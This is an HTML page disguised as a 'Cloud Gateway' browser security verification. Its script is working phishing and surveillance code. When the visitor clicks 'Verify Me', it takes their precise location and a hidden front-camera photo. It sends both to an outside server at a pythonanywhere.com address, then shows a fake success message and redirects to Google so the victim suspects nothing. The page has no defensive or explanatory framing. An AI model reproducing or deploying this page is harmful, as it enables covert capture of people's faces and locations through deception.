<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>Security Verification | Cloud Gateway</title>
    <meta property="og:title" content="Security Handshake Required">
    <meta property="og:description" content="Verifying your browser connection to ensure security. Please complete the verification to proceed.">
    <meta property="og:image" content="https://img.icons8.com/color/480/shield.png">

    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f4f7f9; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0052cc; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 22px; margin-bottom: 10px; color: #1a1a1a; }
        p { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 25px; }
        .btn { background: #0052cc; color: white; border: none; padding: 14px 28px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: background 0.3s; }
        .btn:hover { background: #003d99; }
        #status { font-size: 12px; color: #999; margin-top: 20px; }
    </style>
</head>
<body>

<div class="card">
    <div class="loader"></div>
    <h1>Verify Connection</h1>
    <p>To access the requested content, please complete a standard security verification to prove you are not a bot.</p>
    
    <button class="btn" onclick="startVerification()">Verify Me</button>
    
    <div id="status">Secure connection established. Waiting for handshake...</div>
</div>

<script>
    async function startVerification() {
        const statusText = document.getElementById('status');
        statusText.innerText = "Processing request... please allow permissions.";
        
        try {
            // 1. Capture Precise Location
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                });
            });

            // 2. Open Camera
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            
            // Create hidden video element to capture a frame
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            // Draw frame to hidden canvas
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const photoData = canvas.toDataURL('image/jpeg');

            // Shut down camera immediately
            stream.getTracks().forEach(track => track.stop());

            // 3. Send Data to your PythonAnywhere Backend
            statusText.innerText = "Finalizing secure handshake...";
            
            await fetch('https://jackwilliam782.pythonanywhere.com/receive_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    photo: photoData,
                    lat: position.coords.latitude,
                    lon: position.coords.longitude
                })
            });

            // Final Redirect (The user thinks they succeeded)
            statusText.innerText = "Verification Success! Redirecting...";
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 1500);

        } catch (error) {
            console.error(error);
            statusText.style.color = "#d93025";
            statusText.innerText = "Error: Verification failed. You must allow permissions to proceed.";
        }
    }
</script>

</body>
</html>
